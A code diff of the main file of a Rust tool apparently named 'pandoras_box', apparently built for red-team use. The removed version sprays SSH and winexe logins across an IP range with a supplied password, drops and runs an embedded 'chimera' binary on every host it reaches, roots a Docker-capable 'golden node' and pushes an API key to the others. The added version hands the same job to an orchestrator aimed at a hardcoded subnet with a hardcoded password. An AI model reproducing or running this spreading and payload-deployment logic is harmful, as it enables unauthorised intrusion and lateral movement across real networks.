@@ -1,31 +1,21 @@
-// mod enumeration;
-mod api;
-// mod init;
-mod net;
 use clap::{arg as carg, command, value_parser};
-
+use pandoras_box::*;
 use std::collections::BinaryHeap;
-use std::sync::{Arc, Mutex};
 use std::io::Read;
-// use enumeration::ping;
-//use std::future::Future;
-use crate::net::communicator::{Credentials, Session};
-// use crate::net::spread::spreader::Spreader;
-// use crate::net::spread::spreader::ConnectionPool;
-use crate::net::winexe::*;
-use tokio::sync::watch;
+use std::sync::{Arc, Mutex};
 use flate2::read::ZlibDecoder;
 use std::process::Command;
-
-// const CHIMERA: &[u8] = include_bytes!("../bin/chimera64.zlib");
-const COMPRESSED_CHIMERA: &[u8] = include_bytes!("../bin/chimera_win.zlib");
+use tokio::sync::watch;
+use log::{info, warn, error, debug, LevelFilter};
+use env_logger::{Builder, Target, WriteStyle};
+use chrono::Local;
+use std::fs::OpenOptions;
+use std::io::Write;
 
 struct MemoryReport;
 
 impl Drop for MemoryReport {
     fn drop(&mut self) {
-        // Use an OS-specific command to get memory usage
-        // This is an example for Linux using `ps`
         let output = Command::new("ps")
             .arg("-o")
             .arg("rss=")
@@ -35,8 +25,46 @@ impl Drop for MemoryReport {
             .expect("Failed to execute command");
 
         let memory_usage = String::from_utf8_lossy(&output.stdout);
-        println!("Memory Usage at Exit: {} KB", memory_usage.trim());
+        info!("Memory Usage at Exit: {} KB", memory_usage.trim());
     }
+}
+
+fn setup_logging() -> Result<()> {
+    // Create log file with timestamp
+    let timestamp = Local::now().format("%Y%m%d_%H%M%S");
+    let log_path = format!("./pandoras_box{}.log", timestamp);
+    
+    // Open file in append mode and create if it doesn't exist
+    let file = OpenOptions::new()
+        .create(true)
+        .write(true)
+        .append(true)
+        .open(&log_path)?;
+
+    // Initialize env_logger with custom configuration
+    Builder::new()
+        .target(Target::Pipe(Box::new(file)))
+        .filter_level(LevelFilter::Info) // Capture all logs by default
+        .write_style(WriteStyle::Always)
+        .format(|buf, record| {
+            writeln!(
+                buf,
+                "{} [{:>5}] {}",
+                Local::now().format("%Y-%m-%d %H:%M:%S"),
+                record.level(),
+                record.args()
+            )
+        })
+        .init();
+
+    // Create a console output handler as well
+    let stderr = Builder::new()
+        .filter_level(LevelFilter::Info)
+        .write_style(WriteStyle::Always)
+        .build();
+
+    info!("Logging initialized to {}", log_path);
+    Ok(())
 }
 
 fn decompress_data(compressed_data: &[u8]) -> Vec<u8> {
@@ -46,110 +74,49 @@ fn decompress_data(compressed_data: &[u8]) -> Vec<u8> {
     decompressed_data
 }
 
-
 #[tokio::main]
-async fn main() {
-
+async fn main() -> Result<()> {
+    // Initialize logging first
+    setup_logging()?;
+    
     let matches = command!()
-        .arg(carg!(-r --range <IP_RANGE>)
-            .required(true)
-            .value_parser(value_parser!(String)))
-        .arg(carg!(-p --password <PASSWORD>)
-            .required(true)
-            .value_parser(value_parser!(String))).get_matches();
+        .arg(
+            carg!(-r --range <IP_RANGE>)
+                .required(true)
+                .value_parser(value_parser!(String)),
+        )
+        .arg(
+            carg!(-p --password <PASSWORD>)
+                .required(true)
+                .value_parser(value_parser!(String)),
+        )
+        .get_matches();
 
     let range = matches.get_one::<String>("range").unwrap();
     let password = matches.get_one::<String>("password").unwrap();
-
-
-
-    let (api_key_sender, mut api_key_receiver) = watch::channel(String::new());
-    let shared_api_key = Arc::new(api_key_sender);
-
-
-    // Self::start_winexe_container(self.container_path.clone().unwrap()).await?;
-
-
-    // Decompressed data is created at startup and should live throughout the application lifetime
-    let chimera_win = decompress_data(COMPRESSED_CHIMERA);
-    let chimera_win_arc = Arc::new(chimera_win);
-
-
-    // Initialize the binary heap
-    let server_heap = Arc::new(Mutex::new(BinaryHeap::new()));
-
-    // Fetch srv_handle and srv from api::start_server
-    let (srv, srv_handle) = api::start_server(shared_api_key.clone(), server_heap.clone(), chimera_win_arc).await;
-
-    tokio::spawn(srv);
-
-
-    //WinexeClient::start_winexe_container("/tmp/".into()).await.unwrap();
-
-    let start_tio = std::time::Instant::now();
-    let mut x = crate::net::spread::spreader::Spreader::new(range, password).await;
-
-
-    x.spread().await;
-
-    let nix_cmd = format!("/tmp/chimera password");
-    let win_cmd = format!("C:\\temp\\chimera.exe password");
-
-
-    let cmd_futures = vec![
-        x.command_spray("SSH", &nix_cmd, vec![]),
-        x.command_spray("WINEXE", &win_cmd, vec![]),
-    ];
-
-    futures::future::join_all(cmd_futures).await;
     
+    info!("Starting application with range: {}", range);
+    debug!("Password length: {}", password.len());
 
-    let golden_node;
+    let subnet = match enumerator::Subnet::try_from("10.100.136.0/24") {
+        Ok(s) => s,
+        Err(e) => {
+            error!("Failed to parse subnet: {}", e);
+            return Err(e.into());
+        }
+    };
+    
+    info!("Created subnet: {}", "10.100.136.0/24");
+    let mut orchestrator = orchestrator::Orchestrator::new(subnet);
 
-    loop {
-        if server_heap.lock().unwrap().len() <= 0 {
-            panic!("No nodes suitable nodes found!");
-        } 
-        if let Some(node) = server_heap.lock().unwrap().pop() {
-            println!("{:?}", node);
-            if node.supports_docker {
-                golden_node = node;
-                break;
-            }
+    match orchestrator.run("Cheesed2MeetU!").await {
+        Ok(_) => {
+            info!("Orchestrator completed successfully");
+            Ok(())
+        },
+        Err(e) => {
+            error!("Orchestrator failed: {}", e);
+            Err(e.into())
         }
     }
-
-    let golden_ip = &golden_node.ip.to_string();
-
-    let _ = x.root(golden_ip).await;
-
-    // Wait for the API key to be updated
-    let mut api_key = String::new();
-    while api_key.is_empty() {
-        println!("Waiting for API Key...");
-        api_key_receiver.changed().await.unwrap();
-        api_key = api_key_receiver.borrow().clone();
-    }
-
-    let nix_cmd = format!("/tmp/chimera init -m {} -k {}", golden_ip, api_key);
-    let win_cmd = format!("C:\\temp\\chimera.exe init -m {} -k {}", golden_ip, api_key);
-
-    println!("Nix Command: {}", nix_cmd);
-
-    let cmd_futures = vec![
-        x.command_spray("SSH", &nix_cmd, vec![]),
-        x.command_spray("WINEXE", &win_cmd, vec![&golden_ip]),
-    ];
-
-    futures::future::join_all(cmd_futures).await;
-    //x.command_spray("SSH", &nix_cmd, vec![]).await;
-    //x.command_spray("WINEXE", &win_cmd, vec![&golden_ip]).await;
-
-
-    srv_handle.stop(true).await;
-    x.close().await;
-    println!("{:?}", golden_node);
-
-    let _memory_report = MemoryReport;
-    println!("Total Elapsed Time {:?}", start_tio.elapsed());
 }
